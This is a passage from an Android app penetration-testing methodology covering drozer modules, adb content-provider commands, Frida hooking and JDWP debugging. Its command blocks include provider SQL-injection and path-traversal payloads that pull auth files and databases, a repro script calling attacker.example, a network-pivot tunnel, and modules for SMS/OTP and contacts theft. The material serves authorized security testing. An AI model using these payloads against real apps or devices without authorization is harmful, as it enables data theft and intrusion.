  Enumerate Loaded Classes, Capture Strings, **Capture String Comparisons**, Enumerate Class Methods,
  Search Class Pattern, Trace Class Methods. Built-in shell: `help`, `shell ls`, `activities`,
  `exported_activities`, `services`, `receivers`.
- **Proof:** A string-comparison log line showing the app comparing the user's input against a constant,
  with the constant visible — then the same constant re-derived statically at a `file:line`, and the
  **server's** response to a request made with it.
- **Escalation:** -> D13 (local auth gate), D23 (entitlement/licence), D11 (the files it dumped).
- **Ruled out when:** The comparison operand is a value fetched from the server in this session (not a
  constant), or the gate it protects is cosmetic — i.e. the subsequent API calls fail without a real
  session. Reset the global proxy MobSF sets, or the next session inherits it (-> D26-017).

### D26-029 · Anchor on strings, resources and JNI exports when R8 has renamed every class

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | rated by the SDK behaviour you then prove reachable; the anchoring itself is Support |
| **Attacker** | AM-12 for the technique; the resulting finding carries its own model |
| **Applies to** | R8/ProGuard-obfuscated release builds — i.e. most of them |
| **Maps to** | MASTG-TECH-0019 (Retrieving Strings), MASTG-TECH-0020 (Retrieving Cross References), MASTG-TOOL-0003 (nm); LibScout README (fingerprinting "resilient against common bytecode obfuscation techniques such as identifier renaming"); LibRadar (features "that cannot be obfuscated, such as statistics on Android APIs") |

- **Test:** With R8 renaming, grepping for an SDK's class name fails. Anchor on the three things R8 does
  **not** rename — string constants, resource identifiers and native symbols — then hook the obfuscated
  name you recovered.
- **How:**
  ```bash
  # anchor 1: string constants the SDK logs or sends
  grep -rn '"n_intent_uri"\|"split_id"\|"customOutputUri"\|"mv://"\|"/stlog"' out/sources/
  # anchor 2: resource ids (never renamed)
  grep -rn "R.string\.\|R.layout\." out/sources/ | grep -iE 'crop|zendesk|intercom|engage'
  apktool d -f apk/base.apk -o out2 && grep -rn "crop_\|zui_\|intercom_" out2/res/values/*.xml | head
  # anchor 3: JNI exports
  nm -D --defined-only apk_extracted/lib/arm64-v8a/*.so | grep ' T Java_'
  # anchor 4: dex symbol presence, per split
  for d in $(unzip -Z1 apk/base.apk 'classes*.dex'); do unzip -p apk/base.apk "$d" > /tmp/$d; done
  dexdump -d /tmp/classes*.dex > /tmp/dump.txt
  grep -c "Lcom/vendor/sdk/" /tmp/dump.txt
  # then hook by the obfuscated name the anchor gave you
  frida -U -f com.target.app -l hook.js --no-pause
  ```
- **Proof:** An obfuscated class (`a.b.c.d`) tied to a known SDK by a string or resource anchor, plus a
  Frida hook on that obfuscated name producing the expected behaviour.
- **Escalation:** -> D17 and D18 (SDK reachability: "is this vulnerable library actually entered, with what
  arguments, from where"), D16 (native entry points).
- **Ruled out when:** No anchor of any of the four kinds resolves to the library, *and* the runtime class
  enumeration (`Java.enumerateLoadedClasses`, D26-048) does not list it after the feature is exercised.
  A failed `grep` for the class name alone rules out nothing.

### D26-030 · Establish the drozer session and record the agent's own privilege ceiling first

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — it is what makes every later drozer negative admissible |
| **Attacker** | AM-03 zero-permission local app (the agent runs as an ordinary third-party UID, which is exactly the point) |
| **Applies to** | all |
| **Maps to** | MASTG-TOOL-0015 (drozer); drozer README-verified console commands: `run`, `list`, `shell`, `cd`, `clean`, `contributors`, `echo`, `exit`, `help` (incl. `help intents`), `load`, `module`, `permissions`, `set`, `unset` |

- **Test:** Stand up the console/agent pair, then immediately record what permissions the **agent** holds.
  Every drozer module runs as the agent's UID, so a module that returns "nothing" may be hitting a
  permission wall rather than proving the target is safe.
- **How:**
  ```bash
  pipx install drozer                     # Python 3.8+, JDK 11+
  # or pin the maintained build:
  pipx install --force "git+https://github.com/WithSecureLabs/drozer@v3.1.0"
  adb install drozer-agent.apk            # launch the Agent, toggle "Embedded Server" on
  adb shell am start -n com.mwr.dz/.activities.MainActivity
  adb forward tcp:31415 tcp:31415
  drozer console connect                  # USB path
  drozer console connect --server <device-ip>     # over the network
  ```
  ```
  dz> permissions
  dz> list
  dz> run information.deviceinfo
  dz> run information.permissions        # all permissions WITH protection levels
  ```
- **Proof:** `permissions` printing the agent's granted set. If `android.permission.READ_SMS` is absent,
  `run post.sms.read` returning zero rows proves nothing about the target. `list` printing the module
  inventory confirms the console-agent RPC channel is live, so a later empty module result is a real
  result rather than a dead session.
- **Escalation:** Everything in D04–D08 runs through this session; `information.permissions` exposes
  `normal`-protection-level custom permissions being used as guards (-> D03).
- **Ruled out when:** `permissions` shows the agent holds the permission the module needs, `list` shows the
  module is loaded, and the module still returns nothing. Only then is the empty result evidence.

### D26-031 · Tag drozer `[DEGRADED]` and state its two modern blockers in the report

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-03 |
| **Applies to** | all; decisive at **API 30+** and **API 31+** |
| **Maps to** | MASTG-TOOL-0015 (drozer). MASTG positions drozer as a **last resort**, "when manifest and `adb` inspection aren't sufficient" |

- **Test:** Two platform changes make drozer's enumeration output misleading unless you state them.
- **How:**
  ```
  # blocker 1 — targetSdk >= 30 package visibility
  #   the agent needs QUERY_ALL_PACKAGES, or you must name the package explicitly,
  #   or `run app.package.list` returns a TRUNCATED view.
  dz> run app.package.list -f <keyword>
  dz> run app.package.info -a com.target.app
  # blocker 2 — targetSdk >= 31 explicit export
  #   every component with an intent-filter must declare android:exported,
  #   so "Unable to Query" / "no exported components" is the EXPECTED DEFAULT.
  dz> run app.package.attacksurface com.target.app
  ```
- **Proof:** The attack-surface counts, quoted **alongside** the manifest read that produced the same
  numbers. Where they disagree, the manifest wins and the disagreement is itself the finding lead.
- **Escalation:** -> D03, D04–D08. The value drozer still adds over `adb` is **invocation as an
  unprivileged third-party app UID**, which converts "the manifest says exported" into "reachable by any
  installed app"; and `app.package.manifest` is worth keeping because apktool loses `<uses-sdk>`.
- **Ruled out when:** You have read the merged manifest and the `dumpsys package` resolver tables (D26-036,
  D26-021) and they agree with drozer's counts. **"drozer found no exported components" on an API 31+
  target is the platform default, never evidence of hardening** — write that sentence in the report.

### D26-032 · The `app.*` module reference, mapped to what each module PROVES

| | |
|---|---|
| **Severity ceiling** | **High** (the modules themselves are Support; what they prove routes to D04–D08 where several land at P1) |
| **VRT** | routed: `broken_access_control.exposed_sensitive_android_intent` (**null — rated on what it exposes**), `server_side_injection.sql_injection` (P1), `broken_access_control.idor.*` (P1–P3) |
| **Attacker** | AM-03 zero-permission local app |
| **Applies to** | all |
| **Maps to** | MASTG-TOOL-0015 (drozer); module paths read from each class's `path = [...]` attribute in `WithSecureLabs/drozer@develop`; MASTG-TECH-0160/-0161/-0162/-0163 (enumeration), MASTG-TECH-0148 (Interacting with Android ContentProviders), MASTG-TECH-0164 (Sniffing Implicit Intents and Broadcasts) |

- **Test:** Use the module that proves the claim you intend to make, not the one you remember.
- **How:**

  | Module | Key args | Proves |
  |---|---|---|
  | `app.package.attacksurface <pkg>` | positional pkg | The count of exported activities/receivers/providers/services — the size of the zero-permission IPC surface |
  | `app.package.info` | `-a -d -f -g -p -u -i` | UID/GID, data dir, APK path and the full granted-permission set — the app's privilege ceiling for a confused-deputy chain |
  | `app.package.list` | `-d -f -g -p -u -n` | Which packages hold or define a given permission — finds the weak custom-permission holder |
  | `app.package.manifest <pkg>` | positional pkg | The **merged** on-device manifest, including library-contributed components absent from source |
  | `app.package.launchintent <pkg>` | `-r/--raw` | The canonical entry Intent (action/component/categories/flags) as a tampering baseline |
  | `app.package.shareduid` | `-u` | Two or more packages sharing a UID and their accumulated permissions — a collapsed sandbox boundary |
  | `app.package.native <pkg>` | positional pkg | Native libraries bundled in the APK (misses system-supplied libs, by its own admission) |
  | `app.package.debuggable` | `-f` | `android:debuggable=true` in a shipped build — arbitrary code execution as the app via JDWP |
  | `app.package.backup` | `-f` | `FLAG_ALLOW_BACKUP` — the precondition for extracting private data via backup |
  | `app.activity.info` | `-a -f -i -u -v` | The exported activity set with intent filters; `-u` contrasts against non-exported |
  | `app.activity.start` | `--action --category --component --data-uri --extra --flags --mimetype` | That an activity launches from an unprivileged UID, and that it trusts your extras |
  | `app.activity.forintent` | `--action --data` | Every package willing to handle an action — implicit-intent hijack candidates |
  | `app.broadcast.info` | `-a -f -p -i -u -v` | Exported receivers and the `Permission:` guarding each (`null` = open) |
  | `app.broadcast.send` | full Intent grammar | That a receiver accepts an attacker-crafted broadcast (no `SecurityException` + an observable effect) |
  | `app.broadcast.sniff` | `--action --category --data-authority --data-path --data-scheme --data-type` | That the app's implicit broadcasts, **including their extras**, are readable by any other app |
  | `app.service.info` | `-a -f -i -p -u -v` | Exported services and their permission requirements |
  | `app.service.start` / `app.service.stop` | full Intent grammar | That a third party can start a service with chosen extras, or stop a security-relevant one |
  | `app.service.send <pkg> <component>` | `--msg what arg1 arg2`, `--extra`, `--no-response`, `--timeout` (dflt 20000), `--bundle-as-obj` | That a bound `Messenger` service answers cross-UID, and what each `what` code returns or does |
  | `app.provider.info` | `-a -f -p -u -v` | Per-provider authority, **separate** read/write permissions, `Grant Uri Permissions`, `Multiprocess allowed` |
  | `app.provider.finduri <pkg>` | positional pkg | The `content://` URIs referenced in the APK's strings (misses runtime-constructed URIs) |
  | `app.provider.columns <uri>` | positional uri | The provider's column set — the projection surface for injection |
  | `app.provider.query <uri>` | `--projection --selection --selection-args --order --vertical` | Direct data exposure; also the manual SQLi probe the scanner cannot perform |
  | `app.provider.insert <uri>` | `--boolean --double --float --integer --long --short --string` | Unauthorised write into the provider's store |
  | `app.provider.update <uri>` | same types + `--selection --selection-args` | Unauthorised modification of app state (flipping a security setting) |
  | `app.provider.delete <uri>` | `--selection --selection-args` | Unauthorised deletion (audit/integrity destruction) |
  | `app.provider.read <uri>` | positional uri | That the provider serves files via `openInputStream`, and traversal out of its root |
  | `app.provider.download <uri> <dest>` | positional uri + dest | Arbitrary private-file exfiltration (`Written N bytes` + the local file) |
  | `app.provider.call <uri>` | `--method --argument --bundle` | That the provider's `call()` RPC executes for an unauthenticated caller |

- **Proof:** The module's own output pasted verbatim. H1 #291764 (Nextcloud) and #289000 (Bitwarden) were
  both accepted on exactly this, with no follow-up questions.
- **Escalation:** -> D04 (activities), D05 (receivers/implicit intents), D06 (services/Messenger),
  D07 (providers), D08 (intent redirection). `app.provider.download` returning a `shared_prefs/*.xml` is
  the primitive that carries a P1 in D07.
- **Ruled out when:** The module returns a `SecurityException` naming the permission that stopped it, and
  that permission is `signature`- or `dangerous`-protected. A silent empty result is D26-030's problem,
  not a negative.

### D26-033 · The `scanner.*` blind spots, read from source — and why you must probe manually anyway

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `server_side_injection.sql_injection` (P1) or `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) — whatever the scanner missed |
| **Attacker** | AM-03 |
| **Applies to** | all; mandatory before any provider is recorded as clean |
| **Maps to** | drozer `scanner/provider/injection.py`, `scanner/provider/traversal.py`, `scanner/misc/*.py`, read directly from `WithSecureLabs/drozer@develop` |

- **Test:** The drozer scanners use single hardcoded probes. Know each one's blind spot, and run the
  manual equivalent against at least one URI the scanner called clean.
- **How:**

  | Module | Key args | Proves — and its documented blind spot |
  |---|---|---|
  | `scanner.activity.browsable` | `-a` | BROWSABLE activities and their invocable URI schemes — remote, one-click entry points |
  | `scanner.provider.finduris` | `-a` | Which provider URIs actually answer from an unprivileged context |
  | `scanner.provider.injection` | `-a`/`--uri` | Injection in projection and/or selection. **Blind spot (source-verified):** probes a single `'` and flags only when the exception text contains `unrecognized token` — anything caught, wrapped or worded differently reads as clean |
  | `scanner.provider.traversal` | `-a`/`--uri` | Directory traversal. **Blind spot (source-verified):** one fixed payload, sixteen `../` levels, `/etc/hosts` only, non-empty-read oracle |
  | `scanner.provider.sqltables` | `-a` | Tables enumerable via projection injection |
  | `scanner.misc.native` | `-a` | Packages using native code. **Blind spot (its own note):** only libraries bundled inside the APK |
  | `scanner.misc.readablefiles <dir>` | `-p/--privileged` | World-readable files. Run **without** `-p` for the meaningful result (unprivileged UID) |
  | `scanner.misc.writablefiles <dir>` | `--privileged` | World-writable files — a write primitive into the app's UID |
  | `scanner.misc.secretcodes` | `-v` | Dialer secret codes (`*#*#code#*#*`) opening hidden/engineering activities |
  | `scanner.misc.sflagbinaries [dir]` | dflt `/system` | suid/sgid binaries reachable from the sandbox |

  ```
  dz> run scanner.provider.injection -a com.target.app
  dz> run scanner.provider.traversal -a com.target.app
  # now, MANUALLY, against a URI the scanner listed "Not Vulnerable":
  dz> run app.provider.query content://<auth>/<path> --projection "'"
  dz> run app.provider.query content://<auth>/<path> --selection "1=1) UNION SELECT name FROM sqlite_master--"
  dz> run app.provider.read content://<auth>/../../../../../../data/data/com.target.app/shared_prefs/auth.xml
  dz> run app.provider.download content://<auth>/x/../../../../data/data/com.target.app/databases/app.db /tmp/app.db
  ```
- **Proof:** If the manual `app.provider.query` / `app.provider.read` succeeds on a URI the scanner listed
  under "Not Vulnerable", you have measured the scanner's false-negative rate **on this target**, and every
  other "Not Vulnerable" line in that run is now worthless as evidence. Say so in the ruled-out register.
- **Escalation:** -> D07 (the provider finding itself; a `shared_prefs`/`databases` read is the P1 route),
  D11 (what the file contains).
- **Ruled out when:** You manually probed every enumerated URI with at least a quote, a `UNION SELECT`, a
  traversal to a path **other than** `/etc/hosts`, and a `call()` invocation — and each returned a
  `SecurityException` or an empty cursor with no exception text. "scanner.provider.injection reported Not
  Vulnerable" is never an acceptable ruled-out entry.

### D26-034 · drozer 3.1.0: `scanner.provider.exported` and `app.provider.grant`

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | routed to D07 |
| **Attacker** | AM-03 |
| **Applies to** | **Android 12+** providers that expect `FLAG_GRANT_READ_URI_PERMISSION` / `FLAG_GRANT_WRITE_URI_PERMISSION`; Scoped Storage targets |
| **Maps to** | drozer 3.1.0 release notes as recorded in the corpus |

- **Test:** On modern targets the older modules mis-report two classes: providers that are declared but not
  exported, and providers that only answer when the caller passes a URI grant flag.
- **How:**
  ```
  dz> run scanner.provider.exported -a com.target.app      # only exported="true" providers
  dz> run app.provider.grant --uri content://<auth>/<path> --read --write
  dz> run app.provider.query content://<auth>/<path>
  ```
  `app.provider.grant` auto-calls `grantUriPermission()` so a provider that refuses a bare query can still
  be exercised. 3.1.0 also improves Scoped Storage handling.
- **Proof:** A provider that returned `SecurityException` under `app.provider.query` returning rows after
  `app.provider.grant` — which tells you the provider relies on grants, and moves the question to *who can
  obtain a grant* (-> D08).
- **Escalation:** -> D07 (provider authz), D08 (URI grants obtained through a `PendingIntent` or a
  redirected `ClipData`).
- **Ruled out when:** The provider refuses both with and without a grant, on an agent whose permission set
  you have printed (D26-030). If you are on mainline MWR drozer rather than the WithSecure 3.x build, the
  agent will not run cleanly on API 29+ at all — that is a tool fact, not a target fact.

### D26-035 · The community drozer modules, and reading their declared permissions before believing them

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | routed: `sensitive_data_exposure.*` for the `post.*` capture modules; `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4) for the pivot |
| **Attacker** | AM-04 local app + one common permission — **each `post.*` module declares the permission it needs, and the finding's model is that permission, not "zero permissions"** |
| **Applies to** | engagements where a permission-justification argument matters |
| **Maps to** | `WithSecureLabs/drozer-modules@master`: `mwrlabs/urls.py`, `kernelerror/tools/misc/installcert.py`, `meatballs1/auxillary/port_forward.py`, `metall0id/post/{clipboard,sms,contacts}.py`, `mwrlabs/develop.py` |

- **Test:** Install the community set with `module install <path>`, and read each module's `permissions =`
  declaration before you attribute its result to an unprivileged attacker.
- **How:**

  | Module | Proves |
  |---|---|
  | `scanner.misc.urls` (`mwrlabs/urls.py`) | HTTP/HTTPS URLs in the APK strings — undocumented backends, staging hosts |
  | `tools.misc.installcert` (`kernelerror`) | A CA installation path; its own caveat is that the device may prompt and a lock screen may be required |
  | `auxiliary.portforward` (`meatballs1`) | The device as a network pivot to an internal host (**single connection at a time**, by its own note) |
  | `post.capture.clipboard` / `post.perform.setclipboard` (`metall0id`) | That a *different* app reads the target's clipboard secret |
  | `post.sms.read -f otp` / `post.sms.send` (`metall0id`) | OTP interception by an app holding `READ_SMS` (the module declares that permission) |
  | `post.contacts.read` (`metall0id`) | Contact exfiltration by a `READ_CONTACTS` holder |
  | `post.perform.location`, `post.capture.microphone`, `post.capture.call` (`metall0id`) | Device-level surveillance reach, for permission-justification arguments |
  | `auxiliary.develop` (`mwrlabs`) | Interactive Python inside a drozer module — for building one-off provider/IPC fuzzers |

- **Proof:** The module's output **plus** the agent's `permissions` listing showing it actually held the
  declared permission. Without the second half, the result is unattributable.
- **Escalation:** `scanner.misc.urls` -> D01/D15 (undocumented backend); clipboard -> D20; `post.sms.read`
  -> D13 (OTP interception, but note the model is AM-04 with `READ_SMS`, and background clipboard reads
  have been **dead since Android 10**).
- **Ruled out when:** The module ran with its declared permission granted and still returned nothing. Note
  that `auxiliary.develop` is a fuzzer-building primitive, not a scanner — its silence means you did not
  write a probe.

### D26-036 · `adb shell content` / `cmd content` — the agent-free provider client that reads better at triage

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | routed to D07: `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) up to `server_side_injection.sql_injection` (P1) |
| **Attacker** | shell UID 2000 for the command; **the finding must be re-proved from a real app UID** (D26-065) |
| **Applies to** | all; `cmd content` needs ADB from Android 8.0+ |
| **Maps to** | MASTG-TECH-0148 (Interacting with Android ContentProviders), MASTG-TOOL-0004 (adb); H1 #242727 (Nextcloud, $75), #518669, #534541 |

- **Test:** Prove a provider is reachable with no tooling at all. It reads better at triage than a drozer
  screenshot and removes the "that requires special tooling" objection.
- **How:**
  ```bash
  adb shell content query  --uri content://org.nextcloud/shares
  adb shell content query  --uri content://org.nextcloud/file --projection "* from ocshares --"
  adb shell content read   --uri content://com.target.app.imageCache.provider/<name> > out.bin
  adb shell content insert --uri content://<auth>/<path> --bind k:s:v
  adb shell content update --uri content://<auth>/items/1 --bind price:d:1337
  adb shell content delete --uri content://<auth>/<path> --where "1=1"
  adb shell content call   --uri content://<auth> --method evilMethod --arg 'foo'
  # the runtime component surface, which the manifest does not show:
  adb shell dumpsys package com.target.app > pkg.txt
  sed -n '/Activity Resolver Table/,/Receiver Resolver Table/p' pkg.txt
  sed -n '/Receiver Resolver Table/,/Service Resolver Table/p' pkg.txt
  sed -n '/Service Resolver Table/,/Provider Resolver Table/p' pkg.txt
  adb shell dumpsys package com.target.app | grep -i "Provider{"
  adb shell pm get-app-links com.target.app
  adb shell dumpsys activity providers | grep -i com.target -A10
  adb shell dumpsys activity broadcasts | grep -A6 com.target.app      # runtime-registered receivers
  adb shell dumpsys activity permissions | grep -A6 com.target.app     # live URI grants
  ```
- **Proof:** The `Row: 0 ...` output with the sensitive columns visible. H1 #242727 went further and
  demonstrated the same read with an off-the-shelf Play Store app ("Content Provider Helper"), which
  removes the "that requires developer access" objection entirely — copy that.
- **Escalation:** -> D07 (provider authz), D11 (what the rows contain), D05/D06 (the resolver tables show
  runtime-registered receivers and bound services the manifest never mentions).
- **Ruled out when:** `content query` returns `java.lang.SecurityException: Permission Denial` naming a
  `signature`- or `dangerous`-level permission **and** the same query from an installed unprivileged app
  fails identically. Remember shell is uid 2000 in its own SELinux domain — **more** privileged than a
  third-party app on some paths and less on others, so a shell-only result is never proof of third-party
  exploitability.

### D26-037 · Use the device as a network pivot into the app's internal network

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4), escalating on what the internal service exposes |
| **Attacker** | AM-04 local app with `INTERNET` on a device with privileged network placement (corporate Wi-Fi, tethered VPN, MDM-managed handset) |
| **Applies to** | apps deployed on managed or corporate handsets, or that talk to a host reachable only from the device's network |
| **Maps to** | drozer-modules `meatballs1/auxillary/port_forward.py` |

- **Test:** Where the app talks to an internal host reachable only from the device's network, prove that
  reachability from your workstation — the device is then a usable pivot.
- **How:**
  ```
  dz> run auxiliary.portforward -rh 192.168.5.1 -rp 5555 -lp 4444
      Tunneling :4444 -> 192.168.5.1:5555
  dz> Established tunnel to 192.168.5.1:5555
  ```
  ```bash
  curl -sv http://127.0.0.1:4444/ | head -40
  ```
  The module's own limitation, verbatim: *"This module currently will only forward a single connection at
  a time."* For volume, use `adb reverse`/`adb forward` or a socat relay in the agent's shell.
- **Proof:** `curl http://127.0.0.1:4444/` from your host returning the internal service's banner or
  application response — not a timeout, not a parked page.
- **Escalation:** -> D15. Once reachable, the internal service gets the full API battery, and anything it
  exposes is rated on its own merits.
- **Ruled out when:** The tunnel establishes and the remote port refuses or times out from the device
  itself (`dz> run shell.exec "nc -z -w2 192.168.5.1 5555"`), i.e. the device has no privileged path
  either. Note this is only a finding where the *deployment* puts the device somewhere your workstation
  is not; on a home Wi-Fi test device it proves nothing.

### D26-038 · Sweep the device for debuggable packages and check JDWP acceptance

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) — JDWP gives arbitrary code execution *as the app*, so everything the app's session can do, an attacker with device access can do |
| **Attacker** | AM-11 physical unlocked, or AM-04 where another app can reach the JDWP transport |
| **Applies to** | any shipped build carrying `android:debuggable="true"`. **API gate:** on `targetSdk >= 31` a debuggable release build is unambiguously a developer choice; Android 12 also excludes app data from `adb backup` **unless** `android:debuggable="true"`, which makes the flag doubly valuable |
| **Maps to** | drozer `app.package.debuggable`, `exploit/jdwp/check.py`; MASTG-TOOL-0019 (jdb), MASTG-TECH-0031 (Debugging), MASTG-TECH-0040 (Waiting for the Debugger); CWE-489 |

- **Test:** Sweep the whole device, not just the target — a debuggable *sibling* app that shares a
  `sharedUserId` or holds a permission the target trusts is the same finding by another route.
- **How:**
  ```
  dz> run app.package.debuggable          # DEVICE-WIDE sweep
  dz> run app.package.debuggable -f target
  dz> run exploit.jdwp.check
  ```
  ```bash
  aapt2 dump badging apk/base.apk | grep -i debuggable
  adb shell dumpsys package com.target.app | grep -E 'flags=|pkgFlags'   # DEBUGGABLE in the flag list
  adb jdwp                                   # lists debuggable PIDs
  adb forward tcp:8000 jdwp:<pid>
  jdb -attach localhost:8000
  # in jdb: stop in com.target.app.SecurityGate.check ; locals ; print token ; set allowed = true
  adb shell run-as com.target.app ls -la /data/data/com.target.app/shared_prefs
  ```
- **Proof:** `adb jdwp` listing the target's PID, `jdb` attaching, and `locals`/`print` returning a value
  from inside a security-relevant method — plus `run-as` reading the app's private directory.
- **Escalation:** -> D02 (build integrity), D21 (the resilience consumer), D11 (`run-as` reads the whole
  sandbox with no root), D03 (Android 12 `adb backup` re-enabled by the same flag).
- **Ruled out when:** `aapt2 dump badging` shows no `application-debuggable`, `dumpsys package` flags do
  not include `DEBUGGABLE`, and `adb jdwp` does not list the process while the app is in the foreground.
  Note that *your own* repacked build (D26-008/D26-009) is debuggable by construction — never report your
  own patch.

### D26-039 · Ship the PoC as a replayable command file, not as prose

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — but Google's Mobile VRP prices report quality at a 0.5x / 1x / **1.5x** multiplier, and Samsung's Good Report Bonus can double a High/Critical base reward |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | drozer `load`, `set`, `unset`; objection `commands save`, `commands history`, `import`; Google Mobile VRP "Good Quality" criteria; Samsung: *"Reports based only on static code review, without a working PoC, will be determined as Not Eligible."* |

- **Test:** Package the exploit path so a triager reproduces it in one paste, unattended.
- **How:**
  ```
  # pocs/F-007/poc.dz
  set PKG com.target.app
  run app.package.attacksurface com.target.app
  run app.provider.info -a com.target.app -v
  run app.provider.query content://com.target.app.provider/users
  run app.provider.download content://com.target.app.fileprovider/x/../../../../data/data/com.target.app/shared_prefs/auth.xml /tmp/auth.xml
  ```
  ```
  dz> load pocs/F-007/poc.dz
  ```
  ```bash
  # objection equivalents
  objection -g com.target.app explore --startup-script pocs/F-007/hooks.js
  objection -g com.target.app explore --startup-command 'android sslpinning disable --quiet'
  # inside the REPL:  commands save /tmp/poc.txt   |   import /path/to/poc.js
  # and the distilled shell form that ships with the finding:
  cat > pocs/F-007/repro.sh <<'SH'
  #!/usr/bin/env bash
  set -euo pipefail
  : "${SERIAL:?export SERIAL=<device>}"; PKG=com.target.app
  adb -s "$SERIAL" shell pm clear "$PKG"
  adb -s "$SERIAL" shell am start -n "$PKG/.ExportedActivity" --es url 'https://attacker.example/x'
  sleep 3; adb -s "$SERIAL" logcat -d | grep -m1 'EXPECTED_MARKER'
  SH
  chmod +x pocs/F-007/repro.sh
  ```
- **Proof:** The triager runs `load poc.dz` or `./repro.sh` and reproduces your output byte for byte.
  Google is explicit: *"a short proof-of-concept is more valuable than a video explaining the consequences
  of a specific bug"*, and an APK or a single `adb` line is acceptable where the bug is fully triggerable
  that way.
- **Escalation:** -> D27. A finding with no `repro.sh` is not delivery-ready unless its Limitations field
  says why.
- **Ruled out when:** Not a finding. The check is mechanical: a colleague who was not in the session runs
  the file on a clean device and gets your result.

### D26-040 · `dozermapper/dozer` is a Java bean mapper — it is not this tool

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | n/a |
| **Applies to** | any checklist, report or tooling section that names "dozer" |
| **Maps to** | `github.com/dozermapper/dozer`, verified: *"Dozer is a Java Bean to Java Bean mapper that recursively copies data from one object to another"*. The Android tool is **drozer**, `github.com/WithSecureLabs/drozer`, mirrored at `ReversecLabs/drozer` |

- **Test:** Strike "dozer" from any tooling list. Several circulating community checklists cite
  `dozermapper/dozer` for mobile testing; it is a Java object-mapping library with **no** Android-security
  relevance whatsoever, and citing it signals the list was assembled without verification.
- **How:**
  ```bash
  grep -rin '\bdozer\b' checklist/ docs/ templates/ tools/ | grep -vi drozer
  # correct spellings and sources:
  #   drozer            -> github.com/WithSecureLabs/drozer  (mirrored: ReversecLabs/drozer)
  #   drozer modules    -> github.com/WithSecureLabs/drozer-modules
  #   drozer docs       -> labs.reversec.com/tools/drozer
  # DEAD: labs.withsecure.com/tools/drozer  (301 to a hub page; content gone)
  ```
- **Proof:** The grep returns nothing, or every hit is `drozer`.
- **Escalation:** None. This is a citation-hygiene item; the consequence of getting it wrong is a report
  that a knowledgeable triager stops trusting.
- **Ruled out when:** The grep is clean. The related trap worth recording: the WithSecure labs URL is dead
  (301 to a resources hub) and `ReversecLabs/drozer/wiki/Console` renders only its intro paragraph — the
  authoritative command reference is the README table plus `src/drozer/android.py` and each module's
  `add_arguments()` body.

### D26-041 · Choose spawn or attach deliberately — `-f`, `-N`, `-p`, `-W` reach different code

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all Frida work |
| **Maps to** | MASTG-TOOL-0001 (Frida (Android)), MASTG-TOOL-0031 (Frida); flags verified from frida-tools `application.py` and `ps.py` |

- **Test:** Spawning catches `Application.onCreate`-time behaviour — key derivation, pinning setup, root
  checks, anti-tamper — that attaching misses entirely. Attaching is the only way to hook classes loaded
  by a lazily-initialised class loader. Decide, do not default.
- **How:**
  ```bash
  frida-ps -Uai                                  # -a applications only, -i include all installed
  frida-ps -U -j                                 # JSON
  frida-ps -Ua                                   # running apps
  frida -U -f com.target.app -l hook.js          # spawn, gated (paused until you resume)
  frida -U -f com.target.app -l hook.js --no-pause
  frida -U -N com.target.app -l hook.js          # attach by identifier
  frida -U -n "com.target.app:remote" -l hook.js # attach to a separate-process service
  frida -U -p 12345 -l hook.js                   # attach by PID
  frida -U -W 'com.target.*' -l hook.js          # await a spawn matching PATTERN
  frida -H 127.0.0.1:27042 -N com.target.app     # remote frida-server
  frida -U -f com.target.app -l a.js -l b.js --runtime=v8 --debug
  frida-kill -U <pid>
  ```
  Other verified `application.py` flags: `-D/--device`, `-R/--remote`, `--certificate`, `--origin`,
  `--token`, `--keepalive-interval`, `--device-option`, `--stun-server`, `--relay`,
  `-F/--attach-frontmost`, `--stdio`, `--aux`, `--realm`, `--exceptor`, `--squelch-crash`,
  `-O/--options-file`.
- **Proof:** `frida-ps -Uai` listing the target with a PID. **A hook that prints on `-f` but not on `-p`
  proves the sink executes before you can attach** — that delta is itself evidence for an early-boot code
  path worth reviewing, not a failure.
- **Escalation:** -> D12 (key material captured at `onCreate`), D14 (pinning setup), D21 (RASP
  initialisation), D13 (session bootstrap).
- **Ruled out when:** The same hook produces output under **both** `-f` and `-p` and still misses the
  value you expect — then the code path is not the one you think, and the next step is D26-046 (wide
  tracing) rather than another overload. Two hard constraints to carry: **`frida -f` spawns the app
  itself, so you cannot also deliver an external Intent to that launch** (use spawn gating —
  `device.enable_spawn_gating()` + `on('spawn-added')` -> attach -> resume — or attach with `-p` and invoke
  the parsing method directly); and **killing `frida -f` kills the app**, so attach with `-p` whenever the
  app must survive the session.

### D26-042 · `Java.available` versus `Java.perform` — pick the right guard

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | any script that must load on both Android and iOS |
| **Maps to** | thalysonz/frida-checklist-guide README, quoting frida/frida issue 611 |

- **Test:** Use the correct guard, or the script dies on the wrong OS and you spend the morning debugging
  the target instead of the harness.
- **How:** From the source, verbatim: *"Java.available is to check if you are actually running on
  Android... Java.perform is used to attach that function to the current thread, and, coincidentally,
  will crash if Java is not available."*
  ```javascript
  // Android
  Java.perform(function () { /* ... */ });

  // iOS
  if (ObjC.available) { /* ... */ }

  // guarded, cross-platform
  if (Java.available) { Java.perform(function () { /* ... */ }); }
  // or
  try { Java.perform(function () { /* ... */ }); } catch (e) {}
  ```
- **Proof:** The script loads on both platforms with no unhandled exception in the Frida console.
- **Escalation:** Reliable loading is the precondition for the pinning and root bypasses that do carry
  findings (-> D14, D21).
